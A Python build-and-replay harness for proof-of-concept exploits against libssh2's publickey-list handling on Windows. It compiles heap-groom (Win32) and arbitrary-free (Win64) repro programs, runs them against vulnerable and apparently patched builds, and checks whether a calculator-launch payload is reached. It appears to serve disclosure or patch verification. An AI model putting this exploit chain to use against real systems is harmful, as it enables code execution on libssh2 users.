import os
import platform
import re
import shutil
import subprocess
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parent
POC = ROOT / "poc"
BUILD = ROOT / "build"
MARKERS = [
    ROOT / "x86_calc_payload_reached.txt",
    ROOT / "x64_calc_payload_reached.txt",
]
TARGETS = [
    {
        "name": "x86_vulnerable",
        "compiler_env": "CC_WIN32",
        "compiler": "i686-w64-mingw32-gcc",
        "source": POC / "publickey_win32_heap_groom_calc_repro.c",
        "object": "publickey_win32.o",
        "exe": BUILD / "publickey_win32_heap_groom_calc_repro.exe",
    },
    {
        "name": "x86_checked",
        "compiler_env": "CC_WIN32",
        "compiler": "i686-w64-mingw32-gcc",
        "source": POC / "publickey_win32_heap_groom_calc_repro.c",
        "object": "publickey_win32_checked.o",
        "exe": BUILD / "publickey_win32_heap_groom_calc_repro_checked.exe",
    },
    {
        "name": "x64_vulnerable",
        "compiler_env": "CC_WIN64",
        "compiler": "x86_64-w64-mingw32-gcc",
        "source": POC / "publickey_win64_arbitrary_free_calc_repro.c",
        "object": "publickey_win64.o",
        "exe": BUILD / "publickey_win64_arbitrary_free_calc_repro.exe",
    },
    {
        "name": "x64_checked",
        "compiler_env": "CC_WIN64",
        "compiler": "x86_64-w64-mingw32-gcc",
        "source": POC / "publickey_win64_arbitrary_free_calc_repro.c",
        "object": "publickey_win64_checked.o",
        "exe": BUILD / "publickey_win64_arbitrary_free_calc_repro_checked.exe",
    },
]


def runner():
    if platform.system() == "Windows":
        print("runner=native-windows")
        return []

    wine = shutil.which("wine") or shutil.which("wine64")
    if wine is None:
        print("runner=missing-wine")
        print("install_wine_or_run_on_windows")
        sys.exit(2)

    print(f"runner={wine}")
    return [wine]


def env_path(name):
    value = os.environ.get(name, "").strip()
    if value == "":
        print(f"missing_env={name}")
        sys.exit(2)
    return Path(value)


def compiler(target):
    value = os.environ.get(target["compiler_env"], "").strip()
    selected = target["compiler"]
    if value != "":
        selected = value
    found = shutil.which(selected)
    if found is None:
        print(f"missing_tool={selected}")
        sys.exit(2)
    return found


def build_targets():
    src = env_path("LIBSSH2_SRC")
    objdir = env_path("LIBSSH2_OBJDIR")
    BUILD.mkdir(exist_ok=True)

    for target in TARGETS:
        obj = objdir / target["object"]
        if obj.exists() is False:
            print(f"missing_object={obj}")
            sys.exit(2)

        command = [
            compiler(target),
            "-O2",
            "-s",
            "-DLIBSSH2_WINCNG",
            f"-I{src / 'src'}",
            f"-I{src / 'include'}",
            "-o",
            str(target["exe"]),
            str(target["source"]),
            str(obj),
            "-lws2_32",
            "-lbcrypt",
        ]
        print(f"building={target['name']}")
        completed = subprocess.run(
            command,
            cwd=str(ROOT),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            errors="replace",
        )
        if completed.returncode != 0:
            print(completed.stdout, end="")
            print(f"build_failed={target['name']} exit={completed.returncode}")
            sys.exit(completed.returncode)


def run_exe(prefix, exe, args):
    completed = subprocess.run(
        prefix + [str(exe)] + args,
        cwd=str(ROOT),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        errors="replace",
    )
    return completed.returncode, completed.stdout.splitlines()


def show_matches(lines, patterns):
    expression = re.compile("|".join(patterns))
    for line in lines:
        if expression.search(line):
            print(line)


def remove_markers():
    for marker in MARKERS:
        try:
            marker.unlink()
        except FileNotFoundError:
            pass


def show_marker(name):
    marker = ROOT / name
    if marker.exists():
        text = marker.read_text(errors="replace").strip()
        if len(text) > 0:
            print(text)


def replay_x86(prefix):
    print("== Win32 publickey-list calc chain ==")
    vulnerable = BUILD / "publickey_win32_heap_groom_calc_repro.exe"
    checked = BUILD / "publickey_win32_heap_groom_calc_repro_checked.exe"
    args = ["3", "n", "call", "4068"]
    hit = 0
    hit_lines = []

    for attempt in range(1, 31):
        code, lines = run_exe(prefix, vulnerable, args)
        if code == 77:
            hit = attempt
            hit_lines = lines
            break

    if hit > 0:
        print(f"x86_vulnerable_calc=hit attempt={hit} limit=30")
        show_matches(hit_lines, ["attrs_alloc", r"victim\[", "marker_function_reached", "calc_launch"])
    else:
        print("x86_vulnerable_calc=miss limit=30")

    show_marker("x86_calc_payload_reached.txt")

    checked_hit = 0
    for attempt in range(1, 31):
        code, lines = run_exe(prefix, checked, args)
        if code == 77:
            checked_hit = attempt
            break

    if checked_hit > 0:
        print(f"x86_checked_calc=unexpected_hit attempt={checked_hit} limit=30")
    else:
        print("x86_checked_calc=no_hit limit=30")


def replay_x64(prefix):
    print("")
    print("== Win64 publickey-list calc chain ==")
    vulnerable = BUILD / "publickey_win64_arbitrary_free_calc_repro.exe"
    checked = BUILD / "publickey_win64_arbitrary_free_calc_repro_checked.exe"

    code, lines = run_exe(prefix, vulnerable, ["calc"])
    print(f"x64_vulnerable_calc_exit={code}")
    show_matches(
        lines,
        [
            "victim=",
            "free ptr=",
            "free_ignored_unknown",
            "victim_freed=",
            "same_as_victim=1",
            "calc_payload_reached",
            "calc_launch",
        ],
    )
    show_marker("x64_calc_payload_reached.txt")

    checked_code, checked_lines = run_exe(prefix, checked, ["calc"])
    print(f"x64_checked_calc_exit={checked_code}")
    show_matches(
        checked_lines,
        [
            "victim_freed=",
            "same_as_victim=",
            "safe_callback_reached",
            "calc_payload_reached",
            "calc_launch",
        ],
    )


def main():
    remove_markers()
    build_targets()
    prefix = runner()
    replay_x86(prefix)
    replay_x64(prefix)


if __name__ == "__main__":
    main()
